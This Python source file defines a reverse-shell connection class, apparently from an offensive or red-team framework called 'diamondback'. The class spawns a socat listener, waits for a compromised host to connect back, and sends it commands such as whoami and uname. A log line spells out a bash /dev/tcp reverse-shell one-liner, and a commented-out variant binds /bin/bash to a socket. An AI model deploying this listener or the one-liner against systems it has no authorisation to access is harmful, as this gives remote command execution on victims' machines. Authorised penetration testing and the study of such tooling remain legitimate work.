#!/usr/bin/env python3
import logging
import subprocess
import shlex
import time
import traceback
import select
import socket
import os

from diamondback.connection import Connection,ConnectionState




class SocatReverseShellConnection( Connection ):
    def __init__( self, target_address, username, password, port=4444 ):
        super().__init__( target_address, username, password )  # Call the abstract class's __init__
        self.logger = logging.getLogger( 'socatrevshellconnection' )

        self.set_connection_type( "socat_reverse" )
        self.set_port( port )

        self.logger.info( 'opening reverse shell connection to target' )

    def execute(self, command, sudo=False):
        self.logger.info(f"[>] Executing: {command}")
        
        # Send command
        self.get_client().stdin.write(f"{command}\n".encode())
        self.get_client().stdin.flush()
        
        # Wait for output
        time.sleep(3)
        
        # Read available output
        output = ""
        while select.select([self.get_client().stdout], [], [], 0.1)[0]:
            chunk = self.get_client().stdout.read(1024).decode('utf-8', errors='ignore')
            if chunk:
                output += chunk
            else:
                break
        
        self.logger.info(f"[<] Output:{output}")
        self.logger.info("-" * 60)
                
        return output
    
    def open( self ):
        """
        Spawn socat to listen for a reverse shell and execute commands.
        
        Args:
            port: Port to listen on
            commands: List of commands to execute on the connected host
        """
        ct = self.get_connection_type( )
        t = self.get_target()
        try:
            # Spawn socat as a subprocess
            # Using TCP-LISTEN with fork to handle connection
            # socat_cmd = [
            #     'socat',
            #     f'TCP-LISTEN:{self.get_port()},reuseaddr,fork',
            #     'EXEC:/bin/bash,pty,stderr,setsid,sigint,sane'
            # ]

            # socat_cmd = [
            #     'socat', 
            #     'file:`tty`,raw,echo=0',
            #     f'TCP-LISTEN:{self.get_port()}'
            # ]
            
            socat_cmd = shlex.split( f"/usr/bin/socat TCP-LISTEN:{self.get_port()},reuseaddr,fork -" )

            self.logger.info(f"[*] Starting socat listener on port {self.get_port()}...")
            self.logger.info("[*] Waiting for connection...")
            
            # Start socat process
            self.client = subprocess.Popen(
                socat_cmd,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                bufsize=0
            )
            
            try:
                # Wait a bit for connection
                time.sleep(5)
                
                # Check if process is still running
                if self.client.poll() is not None:
                    stderr = self.client.stderr.read().decode('utf-8', errors='ignore')
                    self.logger.info(f"[!] Socat exited early: {stderr}")
                    return
                
                self.logger.info("[+] Connection established!")                
                self.connection_state = ConnectionState.CONNECTED
            except Exception as e:
                self.logger.info(f"[!] Error: {e}")
        except:
            tb = traceback.format_exc()
            self.logger.error( tb )
            self.get_errors().append( tb )
            self.logger.error( 'ERROR: unable to open connection? check error logs' )
            self.connection_state = ConnectionState.ERROR
        return self
    
    def close( self ):
        t = self.get_target( )
        self.logger.info( f'closing subprocess connection to reverse shell on to {t}' )

        # Send exit command
        try:
            self.client.stdin.write(b"exit\n")
            self.client.stdin.flush()

            time.sleep(1)
            self.client.terminate()
            try:
                self.client.wait(timeout=2)
            except subprocess.TimeoutExpired:
                self.client.kill()            
        except:
            self.connection_state = ConnectionState.ERROR

        # Cleanup
        self.logger.info("[*] Connection closed")

        self.connection_state = ConnectionState.CLOSED
        return self
    
    def get_client( self ):
        return self.client

    def __del__( self ):
        self.logger.info( 'reverse shell connection deconstructor firing..' )
        if self.connection_state != ConnectionState.CLOSED:
            try:
                self.close( )
            except:
                self.logger.warning( 'quietly handling exception closing connection' )

            self.connection_state = ConnectionState.CLOSED
            self.logger.info( 'marking connection as closed.' )

    def simpler_netcat_style( self, port=4444, commands=None):
        """
        Alternative approach using socat in a simpler netcat-style mode.
        This version is easier to work with programmatically.
        """
        if commands is None:
            commands = ['whoami', 'pwd', 'ls -la', 'uname -a']
        
        # Use socat in a simpler mode
        socat_cmd = [
            'socat',
            f'TCP-LISTEN:{port},reuseaddr',
            'STDOUT'
        ]
        
        self.logger.info(f"[*] Starting socat listener on port {port} (netcat-style)...")
        self.logger.info(f"[*] Connect with: bash -i >& /dev/tcp/127.0.0.1/{port} 0>&1")
        self.logger.info("[*] Waiting for connection...\n")
        
        proc = subprocess.Popen(
            socat_cmd,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            bufsize=0,
            universal_newlines=False
        )
        
        try:
            # Wait for connection
            time.sleep(2)
            
            if proc.poll() is not None:
                self.logger.info("[!] Socat exited early")
                return
            
            self.logger.info("[+] Ready to send commands\n")
            
            # Execute each command
            for cmd in commands:
                self.logger.info(f"[>] Command: {cmd}")
                
                # Send command with newline
                command_bytes = f"{cmd}\n".encode('utf-8')
                proc.stdin.write(command_bytes)
                proc.stdin.flush()
                
                # Give time for command to execute
                time.sleep(0.5)
                
                # Read output (with timeout)
                output_lines = []
                start_time = time.time()
                while time.time() - start_time < 2:
                    if select.select([proc.stdout], [], [], 0.1)[0]:
                        line = proc.stdout.readline()
                        if line:
                            output_lines.append(line.decode('utf-8', errors='ignore'))
                        else:
                            break
                    else:
                        break
                
                self.logger.info(f"[<] Output:")
                for line in output_lines:
                    self.logger.info(f"    {line}", end='')
                self.logger.info("\n" + "-" * 60)
            
            # Close connection
            proc.stdin.write(b"exit\n")
            proc.stdin.flush()
            
        except Exception as e:
            self.logger.info(f"[!] Error: {e}")
        finally:
            time.sleep(1)
            proc.terminate()
            try:
                proc.wait(timeout=2)
            except subprocess.TimeoutExpired:
                proc.kill()
            self.logger.info("\n[*] Listener closed")
